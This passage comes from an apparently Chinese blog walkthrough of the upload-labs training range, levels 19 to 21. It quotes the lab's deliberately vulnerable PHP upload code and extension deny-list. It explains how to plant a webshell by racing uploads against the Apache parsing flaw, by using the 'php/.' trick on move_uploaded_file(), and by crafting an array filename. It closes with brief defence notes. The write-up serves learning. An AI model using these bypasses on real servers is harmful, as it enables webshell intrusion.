</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span> 
</span></span><span class="line"><span class="cl">  <span class="k">var</span> <span class="nv">$cls_arr_ext_accepted</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;.doc&#34;</span><span class="p">,</span> <span class="s2">&#34;.xls&#34;</span><span class="p">,</span> <span class="s2">&#34;.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;.pdf&#34;</span><span class="p">,</span> <span class="s2">&#34;.gif&#34;</span><span class="p">,</span> <span class="s2">&#34;.jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;.rar&#34;</span><span class="p">,</span> <span class="s2">&#34;.7z&#34;</span><span class="p">,</span><span class="s2">&#34;.ppt&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;.html&#34;</span><span class="p">,</span> <span class="s2">&#34;.xml&#34;</span><span class="p">,</span> <span class="s2">&#34;.tiff&#34;</span><span class="p">,</span> <span class="s2">&#34;.jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;.png&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span>  
</span></span><span class="line"><span class="cl">  <span class="sd">/** upload()
</span></span></span><span class="line"><span class="cl"><span class="sd">   **
</span></span></span><span class="line"><span class="cl"><span class="sd">   ** Method to upload the file.
</span></span></span><span class="line"><span class="cl"><span class="sd">   ** This is the only method to call outside the class.
</span></span></span><span class="line"><span class="cl"><span class="sd">   ** @para String name of directory we upload to
</span></span></span><span class="line"><span class="cl"><span class="sd">   ** @returns void
</span></span></span><span class="line"><span class="cl"><span class="sd">  **/</span>
</span></span><span class="line"><span class="cl">  <span class="k">function</span> <span class="nf">upload</span><span class="p">(</span> <span class="nv">$dir</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isUploadedFile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setDir</span><span class="p">(</span> <span class="nv">$dir</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkExtension</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkSize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// if flag to check if the file exists is set to 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cls_file_exists</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkFileExists</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// if we are here, we are ready to move the file to destination
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">move</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// check if we need to rename the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cls_rename_file</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">renameFile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span> <span class="nv">$ret</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="nv">$ret</span> <span class="p">);</span>    
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// if we are here, everything worked as planned :)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resultUpload</span><span class="p">(</span> <span class="s2">&#34;SUCCESS&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span>
</span></span><span class="line"><span class="cl"><span class="o">......</span> 
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里有一个细节，由于可能是这个靶场的作者的某种原因可能有误，上传的图片路径<code>不是放在upload文件夹下</code>，所以我们要进去修改一下第19关的代码文件：
<figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg" title="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg">
        <img
            
            loading="lazy"
            src="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg"
            srcset="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg, https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg 1.5x, https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg 2x"
            sizes="auto"
            alt="https://pic.imgdb.cn/item/64cb6b801ddac507ccc4e93d.jpg">
    </a></figure>
<figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg" title="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg">
        <img
            
            loading="lazy"
            src="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg"
            srcset="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg, https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg 1.5x, https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg 2x"
            sizes="auto"
            alt="https://pic.imgdb.cn/item/64cb6b951ddac507ccc51ca2.jpg">
    </a></figure></p>
<h3 id="绕过方法-18" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-18" class="header-mark"></a>绕过方法</h3><ul>
<li>图片马</li>
<li>条件竞争</li>
<li>Apache解析漏洞</li>
</ul>
<p>这关作者的本意应该是想让我们学习到<strong>Apache解析漏洞</strong>，如果重复发包上传文件<code>webshell.php.7z</code>，有几率导致某次服务器无法对上传过来的文件成功重命名，就导致<code>webshell.php.7z</code>未被重命名被传到服务器里。Apache解析漏洞会将<code>webshell.php.*</code>都当作<code>webshell.php</code>执行。</p>
<p>​</p>
<h2 id="第二十关绕move_uploaded_file" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e5%8d%81%e5%85%b3%e7%bb%95move_uploaded_file" class="header-mark"></a>第二十关(/.绕move_uploaded_file())</h2><h3 id="相关源码-19" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-19" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span><span class="s2">&#34;php5&#34;</span><span class="p">,</span><span class="s2">&#34;php4&#34;</span><span class="p">,</span><span class="s2">&#34;php3&#34;</span><span class="p">,</span><span class="s2">&#34;php2&#34;</span><span class="p">,</span><span class="s2">&#34;html&#34;</span><span class="p">,</span><span class="s2">&#34;htm&#34;</span><span class="p">,</span><span class="s2">&#34;phtml&#34;</span><span class="p">,</span><span class="s2">&#34;pht&#34;</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">,</span><span class="s2">&#34;jspa&#34;</span><span class="p">,</span><span class="s2">&#34;jspx&#34;</span><span class="p">,</span><span class="s2">&#34;jsw&#34;</span><span class="p">,</span><span class="s2">&#34;jsv&#34;</span><span class="p">,</span><span class="s2">&#34;jspf&#34;</span><span class="p">,</span><span class="s2">&#34;jtml&#34;</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">,</span><span class="s2">&#34;aspx&#34;</span><span class="p">,</span><span class="s2">&#34;asa&#34;</span><span class="p">,</span><span class="s2">&#34;asax&#34;</span><span class="p">,</span><span class="s2">&#34;ascx&#34;</span><span class="p">,</span><span class="s2">&#34;ashx&#34;</span><span class="p">,</span><span class="s2">&#34;asmx&#34;</span><span class="p">,</span><span class="s2">&#34;cer&#34;</span><span class="p">,</span><span class="s2">&#34;swf&#34;</span><span class="p">,</span><span class="s2">&#34;htaccess&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;禁止保存为该类型文件！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-19" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-19" class="header-mark"></a>绕过方法</h3><p>代码通过<code>move_uploaded_file()</code>将上传的文件移动到新位置</p>
<p><code>move_uploaded_file()</code>的特性：移动的时候会忽略掉文件末尾的 <code>/.</code>，而<code>php/.</code>可以绕过黑名单。</p>
<p>所以可以上传后门，命名为<code>upload-19.php/.</code></p>
<p>​</p>
<h2 id="第二十一关" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e5%8d%81%e4%b8%80%e5%85%b3" class="header-mark"></a>第二十一关</h2><h3 id="相关源码-20" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-20" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//检查MIME
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$allow_type</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span><span class="s1">&#39;image/gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span><span class="nv">$allow_type</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;禁止上传该类型文件!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//检查文件名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$allow_suffix</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allow_suffix</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;禁止上传该后缀文件!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;文件上传成功！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;文件上传失败！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;请选择要上传的文件！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-20" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-20" class="header-mark"></a>绕过方法</h3><p>验证过程：</p>
<ol>
<li>验证上传路径是否存在</li>
<li>验证[&lsquo;upload_file&rsquo;]的content-type是否合法（可以抓包修改）</li>
<li>判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</li>
<li>判断file不是数组则使用explode(&rsquo;.&rsquo;, strtolower($file))对file进行切割，将file变为一个数组</li>
<li>数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</li>
<li>上传文件</li>
</ol>
<p>绕过：</p>
<p>将要保存的文件名变成一个空间为3的数组，第2个值([1])留空</p>
<p>这样子就会把<code>upload-20.php/</code>与<code>.</code>与拼接</p>
<p>最后就是<code>upload-20.php/.</code></p>
<p><code>move_uploaded_file()</code>移动文件的时候会忽略<code>/.</code>!!</p>
<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg" title="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg">
        <img
            
            loading="lazy"
            src="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg"
            srcset="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg, https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg 1.5x, https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg 2x"
            sizes="auto"
            alt="https://pic.imgdb.cn/item/64cb733f1ddac507ccd84457.jpg">
    </a></figure></p>
<p>​</p>
<p>​</p>
<h1 id="文件上传漏洞防御" class="headerLink">
    <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e9%98%b2%e5%be%a1" class="header-mark"></a>文件上传漏洞防御</h1><h2 id="执行权限" class="headerLink">
    <a href="#%e6%89%a7%e8%a1%8c%e6%9d%83%e9%99%90" class="header-mark"></a>执行权限</h2><p>文件上传后存储目录不给执行权限</p>
<h2 id="解码还原" class="headerLink">
    <a href="#%e8%a7%a3%e7%a0%81%e8%bf%98%e5%8e%9f" class="header-mark"></a>解码还原</h2><p>把上传的文件数据编码后存储，固定方式解析</p>
<h2 id="分站存储" class="headerLink">
    <a href="#%e5%88%86%e7%ab%99%e5%ad%98%e5%82%a8" class="header-mark"></a>分站存储</h2><p>将文件保存在另外一台服务器上</p>
<h2 id="oss对象" class="headerLink">
    <a href="#oss%e5%af%b9%e8%b1%a1" class="header-mark"></a>OSS对象</h2><p>将文件保存在OSS上</p>
</div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2023-08-08</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
                    </span></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="文件包含漏洞"><i class="fas fa-angle-left fa-fw"></i>文件包含漏洞</a>
            <a href="/ssrf%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="SSRF漏洞">SSRF漏洞<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                    <span class="icp">闽ICP备2023013172号</span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div><script>
                    if('serviceWorker' in navigator) {
                        navigator.serviceWorker
                            .register('/sw.min.js', { scope: '/' })
                            .then(function(registration) {
                            });
                
                        navigator.serviceWorker
                            .ready
                            .then(function(registration) {
                            });
                    }
                </script></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
